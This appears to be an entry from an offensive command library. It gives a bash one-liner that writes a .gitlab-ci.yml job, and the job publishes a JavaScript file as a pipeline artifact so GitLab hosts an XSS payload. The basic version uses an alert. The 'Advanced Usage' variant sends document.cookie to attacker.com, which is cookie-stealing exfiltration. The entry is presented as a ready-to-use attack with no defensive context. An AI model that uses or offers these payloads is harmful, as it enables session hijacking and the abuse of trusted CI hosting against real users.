---
data: |-
  echo 'xss_job:
    script:
      - echo "alert(\'Hello: \' + window.parent.location.href);" > alert.js
    artifacts:
      paths:
        - alert.js
      expire_in: 4 weeks' > .gitlab-ci.yml
tags:
  - gitlab
  - ci-cd
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 1376a947-b797-4656-8020-38fbcc871849
created_at: '2025-12-13T23:52:43.673Z'
updated_at: '2025-12-13T23:52:43.673Z'
verified: false
validated: true
submitted: true
---
# create-gitlab-ci-yml

## Command

```bash
echo 'xss_job:
  script:
    - echo "alert(\'Hello: \' + window.parent.location.href);" > alert.js
  artifacts:
    paths:
      - alert.js
    expire_in: 4 weeks' > .gitlab-ci.yml
```

## Description

This command creates a .gitlab-ci.yml file configuring a CI/CD job to generate a malicious alert.js file as an artifact, served with application/javascript MIME type.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | The echo content is fixed for this payload | Yes |

## Examples

### Basic Usage

```bash
echo 'xss_job:
  script:
    - echo "alert(\'Hello: \' + window.parent.location.href);" > alert.js
  artifacts:
    paths:
      - alert.js
    expire_in: 4 weeks' > .gitlab-ci.yml
```

### Advanced Usage

Modify the script section for different payloads, e.g., replace alert with fetch for exfiltration.

```bash
echo 'xss_job:
  script:
    - echo "fetch(\'https://attacker.com?cookie=\' + document.cookie);" > alert.js
  artifacts:
    paths:
      - alert.js
    expire_in: 4 weeks' > .gitlab-ci.yml
```

## Expected Output

Creates .gitlab-ci.yml file. After commit and pipeline run, artifact URL is generated for JS download.

## Related

- [[Related Procedure]]
